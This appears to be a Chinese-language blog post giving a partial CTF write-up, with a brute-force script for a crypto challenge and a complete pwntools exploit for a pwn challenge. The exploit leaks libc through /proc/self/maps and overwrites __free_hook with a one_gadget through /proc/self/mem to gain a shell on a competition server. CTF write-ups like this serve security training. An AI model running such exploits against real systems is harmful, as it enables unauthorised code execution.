---
title: 摸鱼之战
author: nepire
avatar: /images/title.ico
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2020-08-28 15:05:30
tags:
keywords:
description:
photos:
---
#  摸鱼城之战
摸……钓鱼城杯和洞佬他们组了个队摸了一天鱼，快乐就完事
![](https://i.imgur.com/RKp1dHo.png)

## Crypto
### confused_flag
爆破，因为flag内的东西不是明文所以符合格式的有好几个一个个去试，最后试成功了
![](https://i.imgur.com/IecGBxV.png)

```
#flag{b09dfe78-df9e-36dd-89a1-b7efb2e19e65}
from pwn import *
for i in range(500):
    n = remote("119.3.45.222",9999)
    cip = n.recvline()[:-1]
    n.close()
    if cip[0:5]=="flag{" and cip[13]=="-" and cip[18]==cip[23]:
        print cip
```

## PWN

## fsplayground
一个文件读写系统，限制了读的文件名里包括路径不能含有flag，这里我们选择读/proc/self/maps获取libcbase然后往/proc/self/mem里free_hook的地址写onegadget一把梭
```python
#flag{910efb50faa7407b916c206217951dd0}
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
#n = process("./chall")
n = remote("119.3.111.133",6666)
elf = ELF("./chall")
libc = elf.libc

def choice(idx):
    n.recvuntil("Your choice: ")
    n.sendline(str(idx))
def fs_open(filename,idx):
    choice(1)
    n.recvuntil("Filename: ")
    n.send(filename)
    n.recvuntil("Option: ")
    n.sendline(str(idx))
def fs_close():
    choice(2)
def fs_seek(offset):
    choice(3)
    n.recvuntil("Offset: ")
    n.sendline(str(offset))
def fs_read(size):
    choice(4)
    n.recvuntil("Size: ")
    n.sendline(str(size))
def fs_write(size,content):
    choice(5)
    n.recvuntil("Size: ")
    n.sendline(str(size))
    n.recvuntil("Content: ")
    n.send(content)
def fs_exit():
    choice(6)

fs_open("/proc/self/maps",0)
fs_read(0x300)
n.recvuntil("Content: ")
codebase = int(n.recv(12),16)
print hex(codebase)
n.recvuntil("r-xp")
libcbase = int(n.recvuntil("r-xp")[-30:-18],16)
print hex(libcbase)
fs_close()
fs_open("/proc/self/mem",1)
free_hook = libcbase + libc.sym["__free_hook"]
one = libcbase + 0x4f3c2
fs_seek(free_hook)
fs_write(0x10,p64(one))

n.interactive()
```



剩下的就是赛后复现了，等有空写
